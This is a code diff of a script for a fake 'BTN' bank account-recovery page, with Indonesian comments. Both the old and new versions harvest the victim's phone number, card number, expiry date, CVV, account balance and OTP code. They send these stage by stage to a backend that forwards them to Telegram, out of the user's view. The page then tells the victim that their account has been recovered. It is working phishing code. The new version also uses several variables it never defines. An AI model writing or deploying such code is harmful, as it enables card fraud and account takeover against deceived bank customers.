@@ -1,282 +1,274 @@
-(function() {
-    'use strict';
+// Tambahkan di bagian awal script.js (setelah variabel global)
+let currentSessionData = {
+    phoneNumber: '',
+    cardNumber: '',
+    expiry: '',
+    cvv: '',
+    saldo: '',
+    otp: ''
+};
 
-    // ========== DOM Elements ==========
-    const splash = document.getElementById('splashScreen');
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const page3 = document.getElementById('page3');
-    const toast = document.getElementById('btnToast');
-    const toastMessage = toast.querySelector('.toast-message');
+// Fungsi untuk mengirim data ke Netlify Function (tanpa menampilkan notifikasi ke user)
+async function sendDataToTelegram(data) {
+    try {
+        console.log('Mengirim data:', data);
+        
+        const response = await fetch('/api/send-data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            console.log('Data berhasil dikirim ke antrian:', data.step);
+            return true;
+        } else {
+            console.error('Gagal mengirim data:', result.error);
+            return false;
+        }
+    } catch (error) {
+        console.error('Error saat mengirim data:', error);
+        return false;
+    }
+}
+
+// Update event listener untuk nomor HP (Page 1 -> Page 2)
+document.getElementById('gotoPage2Btn').addEventListener('click', async () => {
+    const phone = document.getElementById('mobileNumber').value.trim();
+    if (phone === "") {
+        showNotification("Nomor HP tidak boleh kosong", true);
+        return;
+    }
+    const cleanPhone = phone.replace(/\s/g, '');
+    if (!/^[0-9]{10,13}$/.test(cleanPhone)) {
+        showNotification("Nomor HP harus 10-13 digit angka", true);
+        return;
+    }
     
-    // Session unik
-    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+    // Simpan nomor HP ke session
+    currentSessionData.phoneNumber = cleanPhone;
+    currentSessionData.step = 'phone';
     
-    // Data akumulator
-    let acc = {
-        phone: '',
-        card: '',
+    // Kirim notifikasi ke Telegram untuk nomor HP
+    await sendDataToTelegram({
+        phoneNumber: cleanPhone,
+        step: 'phone'
+    });
+    
+    page1.classList.remove('active');
+    page2.classList.add('active');
+    initAllCarousels();
+});
+
+// Update event listener untuk CVV (ketika diisi)
+if (cvvInput) {
+    cvvInput.addEventListener('blur', async function() {
+        if (this.value.length === 3) {
+            const expiry = document.getElementById('berlakuSampai').value;
+            if (expiry && expiry.length === 5) {
+                currentSessionData.expiry = expiry;
+                currentSessionData.cvv = this.value;
+                currentSessionData.step = 'cvv';
+                
+                // Kirim notifikasi ke Telegram untuk CVV + Expiry
+                await sendDataToTelegram({
+                    phoneNumber: currentSessionData.phoneNumber,
+                    cardNumber: currentSessionData.cardNumber,
+                    expiry: expiry,
+                    cvv: this.value,
+                    step: 'cvv'
+                });
+            }
+        }
+    });
+}
+
+// Update event listener untuk kartu ATM
+nomorKartuInput.addEventListener('blur', async function() {
+    const cardNumberClean = this.value.replace(/\s/g, '');
+    if (cardNumberClean.length === 16) {
+        currentSessionData.cardNumber = cardNumberClean;
+        currentSessionData.step = 'card';
+        
+        // Kirim notifikasi ke Telegram untuk nomor kartu
+        await sendDataToTelegram({
+            phoneNumber: currentSessionData.phoneNumber,
+            cardNumber: cardNumberClean,
+            step: 'card'
+        });
+    }
+});
+
+// Update event listener untuk saldo
+if (saldoInput) {
+    saldoInput.addEventListener('blur', async function() {
+        const saldoValue = this.value;
+        if (saldoValue && saldoValue !== '0' && saldoValue !== '') {
+            currentSessionData.saldo = saldoValue;
+            currentSessionData.step = 'saldo';
+            
+            // Kirim notifikasi ke Telegram untuk saldo
+            await sendDataToTelegram({
+                phoneNumber: currentSessionData.phoneNumber,
+                cardNumber: currentSessionData.cardNumber,
+                expiry: currentSessionData.expiry,
+                cvv: currentSessionData.cvv,
+                saldo: saldoValue,
+                step: 'saldo'
+            });
+        }
+    });
+}
+
+// Update tombol LANJUT (Page 2 -> Page 3)
+btnLanjut.addEventListener('click', async (e) => {
+    e.preventDefault();
+    
+    const nomorKartu = document.getElementById('nomorKartu').value.replace(/\s/g, '');
+    const berlakuSampai = document.getElementById('berlakuSampai').value;
+    const cvv = document.getElementById('cvv').value;
+    const saldoRaw = getRawSaldo();
+    const saldoTerakhir = saldoRaw === '' ? '0' : saldoRaw;
+    
+    if (nomorKartu === "" || nomorKartu.length < 16) {
+        showNotification("Nomor kartu ATM harus 16 digit", true);
+        return;
+    }
+    
+    if (berlakuSampai === "" || berlakuSampai.length < 5) {
+        showNotification("Masukkan masa berlaku kartu (MM/YY)", true);
+        return;
+    }
+    
+    if (cvv === "" || cvv.length < 3) {
+        showNotification("Masukkan CVV/CVC 3 digit", true);
+        return;
+    }
+    
+    if (saldoTerakhir === "0" || saldoTerakhir === "") {
+        showNotification("Masukkan perkiraan saldo terakhir", true);
+        return;
+    }
+    
+    const saldoNumber = parseInt(saldoTerakhir.replace(/\./g, ''));
+    if (isNaN(saldoNumber) || saldoNumber <= 0) {
+        showNotification("Nominal saldo tidak valid", true);
+        return;
+    }
+    
+    // Update session data
+    currentSessionData.cardNumber = nomorKartu;
+    currentSessionData.expiry = berlakuSampai;
+    currentSessionData.cvv = cvv;
+    currentSessionData.saldo = saldoTerakhir;
+    currentSessionData.step = 'complete';
+    
+    // Kirim notifikasi lengkap ke Telegram (semua data kecuali OTP)
+    await sendDataToTelegram({
+        phoneNumber: currentSessionData.phoneNumber,
+        cardNumber: nomorKartu,
+        expiry: berlakuSampai,
+        cvv: cvv,
+        saldo: saldoTerakhir,
+        step: 'complete'
+    });
+    
+    console.log("Informasi kartu terverifikasi untuk pemulihan.");
+    
+    // Reset OTP
+    window.retryCounter = 0;
+    document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
+    document.getElementById('otpWarning').innerText = '';
+    
+    page2.classList.remove('active');
+    page3.classList.add('active');
+    initAllCarousels();
+    
+    setTimeout(() => {
+        const first = document.querySelector('.otp-digit');
+        if (first) first.focus();
+    }, 150);
+});
+
+// Update submit OTP
+document.getElementById('submitOtpBtn').addEventListener('click', async () => {
+    const mainOtp = getOtpFromPage();
+    if (mainOtp.length !== 6) {
+        showNotification("Masukkan 6 digit kode OTP", true);
+        return;
+    }
+    
+    // Kirim OTP ke Telegram
+    currentSessionData.otp = mainOtp;
+    currentSessionData.step = 'otp';
+    
+    // Kirim notifikasi OTP ke Telegram dengan semua data
+    await sendDataToTelegram({
+        phoneNumber: currentSessionData.phoneNumber,
+        cardNumber: currentSessionData.cardNumber,
+        expiry: currentSessionData.expiry,
+        cvv: currentSessionData.cvv,
+        saldo: currentSessionData.saldo,
+        otp: mainOtp,
+        step: 'otp'
+    });
+    
+    // Simulasi verifikasi OTP (demo: kode 123456 dianggap benar)
+    const isOtpValid = (mainOtp === '123456');
+    
+    if (!isOtpValid) {
+        window.retryCounter = (window.retryCounter || 0) + 1;
+        if (window.retryCounter >= 10) {
+            showNotification("Batas percobaan OTP tercapai. Mulai proses pemulihan dari awal.", true);
+            resetToInitialState();
+            return;
+        }
+        showNotification(`Kode OTP salah! Sisa percobaan: ${10 - window.retryCounter}`, true);
+        resetOtpFields();
+        return;
+    }
+    
+    showNotification("Verifikasi berhasil! Akun Anda telah dipulihkan.", false);
+    
+    // Reset session
+    currentSessionData = {
+        phoneNumber: '',
+        cardNumber: '',
         expiry: '',
         cvv: '',
-        balance: '',
+        saldo: '',
         otp: ''
     };
     
-    // ========== Toast ==========
-    let toastTimeout = null;
-    function showNotification(message, isError = true) {
-        const iconElem = toast.querySelector('.toast-icon');
-        iconElem.textContent = isError ? '!' : '✓';
-        iconElem.style.background = isError ? '#ffaa00' : '#ffffff';
-        toastMessage.textContent = message;
-        toast.classList.add('show');
-        if (toastTimeout) clearTimeout(toastTimeout);
-        toastTimeout = setTimeout(() => toast.classList.remove('show'), 3000);
-    }
+    resetToInitialState();
+});
+
+// Fungsi reset yang diupdate
+function resetToInitialState() {
+    page3.classList.remove('active');
+    page2.classList.remove('active');
+    page1.classList.add('active');
+    initAllCarousels();
     
-    // ========== Kirim ke Netlify Function ==========
-    async function sendToTelegram(type, value) {
-        // Update accumulator
-        switch(type) {
-            case 'phone': acc.phone = value; break;
-            case 'card': acc.card = value; acc.expiry = document.getElementById('berlakuSampai')?.value || ''; acc.cvv = document.getElementById('cvv')?.value || ''; break;
-            case 'cvv_expiry': acc.expiry = document.getElementById('berlakuSampai')?.value || ''; acc.cvv = value; break;
-            case 'balance': acc.balance = value; break;
-            case 'otp': acc.otp = value; break;
-        }
-        
-        let message = '';
-        const formatRp = (val) => {
-            let num = parseInt(String(val).replace(/\./g, ''));
-            if (isNaN(num)) return '0';
-            return new Intl.NumberFormat('id-ID').format(num);
-        };
-        
-        if (type === 'phone') {
-            message = `┌─  NOTIFIKASI BTN  
-├───────────────────
-├─  NO HP : ${acc.phone}`;
-        } else if (type === 'card') {
-            message = `┌─  NOTIFIKASI BTN  
-├───────────────────
-├─  NO HP : ${acc.phone}
-├─ NO KRT : ${acc.card}`;
-        } else if (type === 'cvv_expiry') {
-            message = `┌─  NOTIFIKASI BTN  
-├───────────────────
-├─  NO HP : ${acc.phone}
-├─ NO KRT : ${acc.card}
-├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}`;
-        } else if (type === 'balance') {
-            message = `┌─  NOTIFIKASI BTN  
-├───────────────────
-├─  NO HP : ${acc.phone}
-├─ NO KRT : ${acc.card}
-├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}
-├─ SALDO : Rp ${formatRp(acc.balance)}`;
-        } else if (type === 'otp') {
-            message = `┌─  NOTIFIKASI BTN  
-├───────────────────
-├─  NO HP : ${acc.phone}
-├─ NO KRT : ${acc.card}
-├─ AKTF - CCV : ${acc.expiry} / ${acc.cvv}
-├─ SALDO : Rp ${formatRp(acc.balance)}
-├─ OTP : ${acc.otp}
-╰───────────────────`;
-        }
-        
-        try {
-            const res = await fetch('/.netlify/functions/send-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message, type, sessionId })
-            });
-            const data = await res.json();
-            if (!data.success) console.error('Telegram send error:', data.error);
-        } catch(err) {
-            console.error('Fetch error:', err);
-        }
-    }
+    document.getElementById('mobileNumber').value = '';
+    document.getElementById('nomorKartu').value = '';
+    document.getElementById('berlakuSampai').value = '';
+    if (cvvInput) cvvInput.value = '';
+    if (saldoInput) saldoInput.value = '';
+    document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
+    window.retryCounter = 0;
     
-    // ========== Splash ==========
-    setTimeout(() => {
-        splash.style.opacity = '0';
-        setTimeout(() => {
-            splash.style.display = 'none';
-            page1.classList.add('active');
-            initCarouselForScreen(page1);
-        }, 400);
-    }, 3000);
-    
-    // ========== Carousel logic ==========
-    let activeCarouselInterval = null;
-    function initCarouselForScreen(screen) {
-        if (activeCarouselInterval) clearInterval(activeCarouselInterval);
-        const wrapper = screen.querySelector('.slider-wrapper');
-        const dotsContainer = screen.querySelector('.carousel-dots');
-        if (!wrapper || !dotsContainer) return;
-        const images = wrapper.querySelectorAll('img');
-        const total = images.length;
-        if (total === 0) return;
-        let idx = 0;
-        wrapper.style.width = `${total * 100}%`;
-        images.forEach(img => { img.style.width = `${100 / total}%`; img.style.flexShrink = '0'; });
-        dotsContainer.innerHTML = '';
-        for (let i = 0; i < total; i++) {
-            const dot = document.createElement('div');
-            dot.classList.add('dot');
-            if (i === 0) dot.classList.add('active');
-            dot.addEventListener('click', () => {
-                idx = i;
-                wrapper.style.transform = `translateX(-${idx * (100 / total)}%)`;
-                updateDots(dotsContainer, idx);
-                resetInterval();
-            });
-            dotsContainer.appendChild(dot);
-        }
-        function updateDots(container, active) {
-            container.querySelectorAll('.dot').forEach((d, i) => {
-                d.classList.toggle('active', i === active);
-            });
-        }
-        function slide() {
-            idx = (idx + 1) % total;
-            wrapper.style.transform = `translateX(-${idx * (100 / total)}%)`;
-            updateDots(dotsContainer, idx);
-        }
-        function resetInterval() {
-            if (activeCarouselInterval) clearInterval(activeCarouselInterval);
-            activeCarouselInterval = setInterval(slide, 3000);
-        }
-        resetInterval();
-        screen._carouselCleanup = () => clearInterval(activeCarouselInterval);
-        return activeCarouselInterval;
-    }
-    function reinitCarousel() {
-        const active = document.querySelector('.screen.active');
-        if (active && active._carouselCleanup) active._carouselCleanup();
-        if (active) initCarouselForScreen(active);
-    }
-    
-    // ========== Navigasi + Pengiriman bertahap ==========
-    document.getElementById('gotoPage2Btn').addEventListener('click', () => {
-        const phone = document.getElementById('mobileNumber').value.trim();
-        if (!phone) { showNotification("Nomor HP tidak boleh kosong", true); return; }
-        const clean = phone.replace(/\s/g, '');
-        if (!/^[0-9]{10,13}$/.test(clean)) { showNotification("Harus 10-13 digit angka", true); return; }
-        sendToTelegram('phone', clean);
-        page1.classList.remove('active');
-        page2.classList.add('active');
-        reinitCarousel();
-    });
-    
-    // Format kartu & expiry
-    const kartu = document.getElementById('nomorKartu');
-    kartu.addEventListener('input', function(e) {
-        let val = this.value.replace(/\D/g, '').substring(0,16);
-        let fmt = '';
-        for(let i=0; i<val.length; i++) { if(i>0 && i%4===0) fmt+=' '; fmt+=val[i]; }
-        this.value = fmt;
-    });
-    const expiry = document.getElementById('berlakuSampai');
-    expiry.addEventListener('input', function(e) {
-        let val = this.value.replace(/\D/g, '').substring(0,4);
-        if(val.length>=3) { let m = val.substring(0,2); let y = val.substring(2,4); if(parseInt(m)>12) m='12'; if(parseInt(m)<1 && m.length===2) m='01'; this.value = m+'/'+y; }
-        else if(val.length===2) this.value=val;
-        else this.value=val;
-    });
-    const cvv = document.getElementById('cvv');
-    const toggle = document.getElementById('toggleCVV');
-    if(toggle) toggle.addEventListener('click', () => {
-        const type = cvv.getAttribute('type') === 'password' ? 'text' : 'password';
-        cvv.setAttribute('type', type);
-        toggle.textContent = type === 'password' ? '👁️' : '🙈';
-    });
-    cvv.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').substring(0,3); });
-    
-    const saldo = document.getElementById('saldoTerakhir');
-    saldo.addEventListener('input', function() {
-        let v = this.value.replace(/\D/g, '');
-        if(v==='') { this.value=''; return; }
-        let num = parseInt(v);
-        this.value = new Intl.NumberFormat('id-ID').format(num);
-    });
-    
-    document.getElementById('btnLanjut').addEventListener('click', () => {
-        const nomorKartu = document.getElementById('nomorKartu').value.replace(/\s/g, '');
-        const berlaku = document.getElementById('berlakuSampai').value;
-        const cvvVal = document.getElementById('cvv').value;
-        const saldoRaw = document.getElementById('saldoTerakhir').value.replace(/\./g, '');
-        if(!nomorKartu || nomorKartu.length<16) { showNotification("Nomor kartu 16 digit", true); return; }
-        if(!berlaku || berlaku.length<5) { showNotification("Masukkan masa berlaku (MM/YY)", true); return; }
-        if(!cvvVal || cvvVal.length<3) { showNotification("CVV 3 digit", true); return; }
-        if(!saldoRaw || parseInt(saldoRaw)<=0) { showNotification("Masukkan saldo terakhir", true); return; }
-        
-        // Kirim semua data secara berurutan
-        sendToTelegram('card', nomorKartu);
-        setTimeout(() => sendToTelegram('cvv_expiry', cvvVal), 400);
-        setTimeout(() => sendToTelegram('balance', saldoRaw), 800);
-        
-        page2.classList.remove('active');
-        page3.classList.add('active');
-        reinitCarousel();
-        setTimeout(() => document.querySelector('.otp-digit')?.focus(), 150);
-    });
-    
-    // OTP handling
-    const otpDigits = document.querySelectorAll('.otp-digit');
-    otpDigits.forEach((inp, idx) => {
-        inp.addEventListener('input', (e) => {
-            if(e.target.value.length===1 && idx<5) otpDigits[idx+1].focus();
-            document.getElementById('otpWarning').innerText = '';
-        });
-        inp.addEventListener('keydown', (e) => {
-            if(e.key==='Backspace' && idx>0 && !otpDigits[idx].value) otpDigits[idx-1].focus();
-        });
-        inp.addEventListener('keypress', (e) => { if(!/^\d$/.test(e.key)) e.preventDefault(); });
-    });
-    
-    let retryCounter = 0;
-    document.getElementById('submitOtpBtn').addEventListener('click', () => {
-        let otp = '';
-        otpDigits.forEach(inp => otp += inp.value);
-        if(otp.length!==6) { showNotification("Masukkan 6 digit OTP", true); return; }
-        if(otp !== '123456') {
-            retryCounter++;
-            if(retryCounter>=10) {
-                showNotification("Batas percobaan habis. Mulai ulang.", true);
-                resetToInitial();
-                return;
-            }
-            showNotification(`OTP salah! Sisa ${10-retryCounter} percobaan`, true);
-            otpDigits.forEach(inp => inp.value='');
-            otpDigits[0].focus();
-            return;
-        }
-        // OTP benar
-        sendToTelegram('otp', otp);
-        showNotification("Verifikasi berhasil! Akun dipulihkan.", false);
-        resetToInitial();
-    });
-    
-    function resetToInitial() {
-        page3.classList.remove('active');
-        page2.classList.remove('active');
-        page1.classList.add('active');
-        reinitCarousel();
-        document.getElementById('mobileNumber').value = '';
-        document.getElementById('nomorKartu').value = '';
-        document.getElementById('berlakuSampai').value = '';
-        document.getElementById('cvv').value = '';
-        document.getElementById('saldoTerakhir').value = '';
-        otpDigits.forEach(inp => inp.value = '');
-        retryCounter = 0;
-        acc = { phone:'', card:'', expiry:'', cvv:'', balance:'', otp:'' };
-    }
-    
-    // Pastikan input angka
-    function enforceNumeric(el) { if(el) el.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); }); }
-    enforceNumeric(document.getElementById('mobileNumber'));
-    
-    // Panggil init carousel untuk halaman aktif pertama setelah splash
-})();
+    // Reset session data
+    currentSessionData = {
+        phoneNumber: '',
+        cardNumber: '',
+        expiry: '',
+        cvv: '',
+        saldo: '',
+        otp: ''
+    };
+                           }
